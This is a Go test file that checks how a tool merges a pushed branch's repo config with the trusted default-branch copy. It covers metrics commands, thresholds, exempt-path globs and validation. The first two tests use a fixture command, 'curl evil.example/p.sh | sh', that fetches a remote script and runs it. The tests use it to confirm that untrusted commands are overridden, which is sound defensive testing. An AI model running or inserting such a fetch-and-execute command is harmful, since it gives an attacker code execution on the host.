package config

import (
	"math"
	"slices"
	"strings"
	"testing"

	"github.com/kunchenguid/no-mistakes/internal/types"
)

func float64Ptr(f float64) *float64 { return &f }

// TestEffectiveRepoConfig_CommandsMetricsTrustedOnly pins commands.metrics to
// the same semantics commands.test already has: the daemon runs it verbatim
// through sh -c, so the trusted default-branch copy wins by default.
func TestEffectiveRepoConfig_CommandsMetricsTrustedOnly(t *testing.T) {
	pushed := &RepoConfig{Commands: Commands{Metrics: "curl evil.example/p.sh | sh"}}
	trusted := &RepoConfig{Commands: Commands{Metrics: "make crap"}}

	effective := EffectiveRepoConfig(pushed, trusted, false)
	if effective.Commands.Metrics != "make crap" {
		t.Fatalf("commands.metrics = %q, want the trusted %q", effective.Commands.Metrics, "make crap")
	}
	if pushed.Commands.Metrics != "curl evil.example/p.sh | sh" {
		t.Fatalf("pushed copy was mutated: commands.metrics = %q", pushed.Commands.Metrics)
	}
}

// TestEffectiveRepoConfig_CommandsMetricsOptInUsesPushedValue pins the
// allow_repo_commands opt-in, which the maintainer sets on the default branch
// to hand command selection to the pushed branch.
func TestEffectiveRepoConfig_CommandsMetricsOptInUsesPushedValue(t *testing.T) {
	pushed := &RepoConfig{Commands: Commands{Metrics: "curl evil.example/p.sh | sh"}}
	trusted := &RepoConfig{Commands: Commands{Metrics: "make crap"}}

	effective := EffectiveRepoConfig(pushed, trusted, true)
	if effective.Commands.Metrics != "curl evil.example/p.sh | sh" {
		t.Fatalf("commands.metrics with allow_repo_commands = %q, want the pushed value", effective.Commands.Metrics)
	}
}

// TestEffectiveRepoConfig_CommandsMetricsNoTrustedCopyIsDropped pins the
// fail-closed case: with nothing trusted to read, the pushed command is
// dropped rather than executed.
func TestEffectiveRepoConfig_CommandsMetricsNoTrustedCopyIsDropped(t *testing.T) {
	pushed := &RepoConfig{Commands: Commands{Metrics: "make crap"}}

	effective := EffectiveRepoConfig(pushed, nil, false)
	if effective.Commands.Metrics != "" {
		t.Fatalf("commands.metrics without a trusted copy = %q, want empty", effective.Commands.Metrics)
	}
}

// TestEffectiveRepoConfig_MetricsBlockTrustedOnly pins the whole metrics block
// as trusted-only: the threshold is the gate's strength, so a pushed branch
// must not be able to set it.
func TestEffectiveRepoConfig_MetricsBlockTrustedOnly(t *testing.T) {
	pushed := &RepoConfig{Metrics: MetricsRaw{Threshold: float64Ptr(999), ExemptPaths: []string{"internal/**"}}}
	trusted := &RepoConfig{Metrics: MetricsRaw{Threshold: float64Ptr(30), ExemptPaths: []string{"vendor/**"}}}

	effective := EffectiveRepoConfig(pushed, trusted, false)
	if effective.Metrics.Threshold == nil || *effective.Metrics.Threshold != 30 {
		t.Fatalf("metrics.threshold = %v, want the trusted 30", effective.Metrics.Threshold)
	}
	if !slices.Equal(effective.Metrics.ExemptPaths, []string{"vendor/**"}) {
		t.Fatalf("metrics.exempt_paths = %v, want the trusted [vendor/**]", effective.Metrics.ExemptPaths)
	}
}

// TestEffectiveRepoConfig_MetricsBlockOptInStillUsesTrustedValue is issue 10's
// acceptance criterion that a contributor cannot raise the threshold to clear
// their own breach. allow_repo_commands hands over command and agent
// selection, never a gate's strength, so the trusted block still wins.
func TestEffectiveRepoConfig_MetricsBlockOptInStillUsesTrustedValue(t *testing.T) {
	pushed := &RepoConfig{Metrics: MetricsRaw{Threshold: float64Ptr(999), ExemptPaths: []string{"internal/**"}}}
	trusted := &RepoConfig{Metrics: MetricsRaw{Threshold: float64Ptr(30), ExemptPaths: []string{"vendor/**"}}}

	effective := EffectiveRepoConfig(pushed, trusted, true)
	if effective.Metrics.Threshold == nil || *effective.Metrics.Threshold != 30 {
		t.Fatalf("metrics.threshold with allow_repo_commands = %v, want the trusted 30", effective.Metrics.Threshold)
	}
	if !slices.Equal(effective.Metrics.ExemptPaths, []string{"vendor/**"}) {
		t.Fatalf("metrics.exempt_paths with allow_repo_commands = %v, want the trusted [vendor/**]", effective.Metrics.ExemptPaths)
	}
}

// TestEffectiveRepoConfig_MetricsBlockNoTrustedCopyIsZeroed pins the
// fail-closed case on both sides of the allow_repo_commands opt-in.
func TestEffectiveRepoConfig_MetricsBlockNoTrustedCopyIsZeroed(t *testing.T) {
	for _, allowRepoCommands := range []bool{false, true} {
		pushed := &RepoConfig{Metrics: MetricsRaw{Threshold: float64Ptr(999), ExemptPaths: []string{"internal/**"}}}

		effective := EffectiveRepoConfig(pushed, nil, allowRepoCommands)
		if effective.Metrics.Threshold != nil {
			t.Fatalf("metrics.threshold without a trusted copy (allow_repo_commands=%v) = %v, want unset", allowRepoCommands, *effective.Metrics.Threshold)
		}
		if effective.Metrics.ExemptPaths != nil {
			t.Fatalf("metrics.exempt_paths without a trusted copy (allow_repo_commands=%v) = %v, want nil", allowRepoCommands, effective.Metrics.ExemptPaths)
		}
	}
}

// TestEffectiveRepoConfig_MetricsExemptPathsDoesNotAliasTrustedSlice pins the
// clone: a bare struct copy would share the trusted config's backing array, so
// one run's resolution could rewrite what the next run reads as trusted.
func TestEffectiveRepoConfig_MetricsExemptPathsDoesNotAliasTrustedSlice(t *testing.T) {
	trusted := &RepoConfig{Metrics: MetricsRaw{ExemptPaths: []string{"vendor/**"}}}

	effective := EffectiveRepoConfig(&RepoConfig{}, trusted, false)
	effective.Metrics.ExemptPaths[0] = "**"

	if !slices.Equal(trusted.Metrics.ExemptPaths, []string{"vendor/**"}) {
		t.Fatalf("trusted metrics.exempt_paths = %v, want it unchanged at [vendor/**]", trusted.Metrics.ExemptPaths)
	}
}

// TestMerge_CarriesMetricsThresholdAndExemptPaths pins the resolution a step
// reads. A value that stops at RepoConfig never reaches the gate.
func TestMerge_CarriesMetricsThresholdAndExemptPaths(t *testing.T) {
	repo := &RepoConfig{Metrics: MetricsRaw{Threshold: float64Ptr(12.5), ExemptPaths: []string{"vendor/**"}}}

	cfg := Merge(DefaultGlobalConfig(), repo)
	if cfg.Metrics.Threshold != 12.5 {
		t.Fatalf("Metrics.Threshold = %v, want 12.5", cfg.Metrics.Threshold)
	}
	if !slices.Equal(cfg.Metrics.ExemptPaths, []string{"vendor/**"}) {
		t.Fatalf("Metrics.ExemptPaths = %v, want [vendor/**]", cfg.Metrics.ExemptPaths)
	}
}

func TestMerge_MetricsThresholdDefaultsTo30(t *testing.T) {
	cfg := Merge(DefaultGlobalConfig(), &RepoConfig{})
	if cfg.Metrics.Threshold != 30 {
		t.Fatalf("Metrics.Threshold = %v, want the built-in default 30", cfg.Metrics.Threshold)
	}
}

func TestMerge_CarriesCommandsMetrics(t *testing.T) {
	repo := &RepoConfig{Commands: Commands{Metrics: "make crap"}}

	cfg := Merge(DefaultGlobalConfig(), repo)
	if cfg.Commands.Metrics != "make crap" {
		t.Fatalf("Commands.Metrics = %q, want %q", cfg.Commands.Metrics, "make crap")
	}
}

// TestEffectiveRepoConfig_AutoFixMetricsStaysPushedReadable documents that the
// fix budget is a bound on effort, not a gate strength: a pushed branch that
// zeroes it buys itself fewer repair rounds, not a weaker gate.
func TestEffectiveRepoConfig_AutoFixMetricsStaysPushedReadable(t *testing.T) {
	pushed := &RepoConfig{}
	pushed.AutoFix.Metrics = intPtr(0)
	trusted := &RepoConfig{}
	trusted.AutoFix.Metrics = intPtr(3)

	merged := Merge(DefaultGlobalConfig(), EffectiveRepoConfig(pushed, trusted, false))
	if merged.AutoFix.Metrics != 0 {
		t.Fatalf("auto_fix.metrics = %d, want the pushed 0", merged.AutoFix.Metrics)
	}
}

// TestValidateMetricsRaw keeps the rules deliberately minimal: the daemon's
// assertGateTrustedConfigReadable aborts EVERY run of a repository whose
// default-branch config fails to validate, so a rule here is expensive.
func TestValidateMetricsRaw(t *testing.T) {
	tests := []struct {
		name    string
		raw     MetricsRaw
		wantErr string
	}{
		// Zero is a real calibration value: every measured function breaches.
		{name: "zero threshold", raw: MetricsRaw{Threshold: float64Ptr(0)}},
		{name: "threshold with exemptions", raw: MetricsRaw{Threshold: float64Ptr(30), ExemptPaths: []string{"vendor/**"}}},
		{name: "nothing set", raw: MetricsRaw{}},
		{name: "negative threshold", raw: MetricsRaw{Threshold: float64Ptr(-1)}, wantErr: "metrics.threshold must not be negative"},
		{name: "NaN threshold", raw: MetricsRaw{Threshold: float64Ptr(math.NaN())}, wantErr: "metrics.threshold must be a finite number"},
		{name: "infinite threshold", raw: MetricsRaw{Threshold: float64Ptr(math.Inf(1))}, wantErr: "metrics.threshold must be a finite number"},
		{name: "blank exempt path", raw: MetricsRaw{ExemptPaths: []string{"vendor/**", "   "}}, wantErr: "metrics.exempt_paths[1] must not be empty"},
		// matchIgnorePattern answers false for a pattern path.Match rejects, so
		// an unvalidated malformed waiver is inert and the run parks on the very
		// file the maintainer exempted.
		{name: "unclosed character class", raw: MetricsRaw{ExemptPaths: []string{"internal/[generated.go"}}, wantErr: "metrics.exempt_paths[0]"},
		{name: "bare subtree pattern", raw: MetricsRaw{ExemptPaths: []string{"/**"}}, wantErr: "metrics.exempt_paths[0]"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validateMetricsRaw(tt.raw)
			if tt.wantErr == "" {
				if err != nil {
					t.Fatalf("validateMetricsRaw = %v, want no error", err)
				}
				return
			}
			if err == nil {
				t.Fatalf("validateMetricsRaw = nil, want an error containing %q", tt.wantErr)
			}
			if !strings.Contains(err.Error(), tt.wantErr) {
				t.Fatalf("validateMetricsRaw = %q, want it to contain %q", err, tt.wantErr)
			}
		})
	}
}

func TestLoadRepoConfig_MetricsBlockParses(t *testing.T) {
	yaml := `
commands:
  metrics: "make crap"
metrics:
  threshold: 12.5
  exempt_paths:
    - "vendor/**"
auto_fix:
  metrics: 2
`
	cfg, err := LoadRepoFromBytes([]byte(yaml))
	if err != nil {
		t.Fatalf("LoadRepoFromBytes: %v", err)
	}
	if cfg.Commands.Metrics != "make crap" {
		t.Errorf("Commands.Metrics = %q, want %q", cfg.Commands.Metrics, "make crap")
	}
	if cfg.Metrics.Threshold == nil || *cfg.Metrics.Threshold != 12.5 {
		t.Errorf("Metrics.Threshold = %v, want 12.5", cfg.Metrics.Threshold)
	}
	if !slices.Equal(cfg.Metrics.ExemptPaths, []string{"vendor/**"}) {
		t.Errorf("Metrics.ExemptPaths = %v, want [vendor/**]", cfg.Metrics.ExemptPaths)
	}
	if cfg.AutoFix.Metrics == nil || *cfg.AutoFix.Metrics != 2 {
		t.Errorf("AutoFix.Metrics = %v, want 2", cfg.AutoFix.Metrics)
	}
}

// TestLoadRepoConfig_NegativeMetricsThresholdFailsTheLoad pins that an invalid
// block fails on the pushed copy too, before it merges.
func TestLoadRepoConfig_NegativeMetricsThresholdFailsTheLoad(t *testing.T) {
	if _, err := LoadRepoFromBytes([]byte("metrics:\n  threshold: -1\n")); err == nil {
		t.Fatal("LoadRepoFromBytes = nil error, want a load failure on a negative threshold")
	}
}

// TestLoadRepoConfig_MalformedMetricsExemptGlobFailsTheLoad pins that a waiver
// path.Match cannot compile is a config error rather than a silently inert
// entry that lets the gate park on the exempted file.
func TestLoadRepoConfig_MalformedMetricsExemptGlobFailsTheLoad(t *testing.T) {
	if _, err := LoadRepoFromBytes([]byte("metrics:\n  exempt_paths:\n    - \"internal/[generated.go\"\n")); err == nil {
		t.Fatal("LoadRepoFromBytes = nil error, want a load failure on a malformed exempt glob")
	}
}

// TestLoadRepoConfig_ValidMetricsExemptGlobStillLoads pins that the new rule
// did not narrow the patterns a maintainer can actually write.
func TestLoadRepoConfig_ValidMetricsExemptGlobStillLoads(t *testing.T) {
	cfg, err := LoadRepoFromBytes([]byte("metrics:\n  exempt_paths:\n    - \"vendor/**\"\n    - \"*_generated.go\"\n"))
	if err != nil {
		t.Fatalf("LoadRepoFromBytes: %v", err)
	}
	if !slices.Equal(cfg.Metrics.ExemptPaths, []string{"vendor/**", "*_generated.go"}) {
		t.Errorf("Metrics.ExemptPaths = %v, want both valid globs", cfg.Metrics.ExemptPaths)
	}
}

// TestLoadRepoConfig_SkipStepsAcceptsMetrics pins that the new step name is a
// valid value for the trusted standing skip list. normalizeSkipSteps validates
// against types.AllSteps(), so this also proves the step is registered there.
func TestLoadRepoConfig_SkipStepsAcceptsMetrics(t *testing.T) {
	cfg, err := LoadRepoFromBytes([]byte("skip_steps:\n  - metrics\n"))
	if err != nil {
		t.Fatalf("LoadRepoFromBytes: %v", err)
	}
	if !slices.Equal(cfg.SkipSteps, []types.StepName{types.StepMetrics}) {
		t.Errorf("SkipSteps = %v, want [metrics]", cfg.SkipSteps)
	}
}
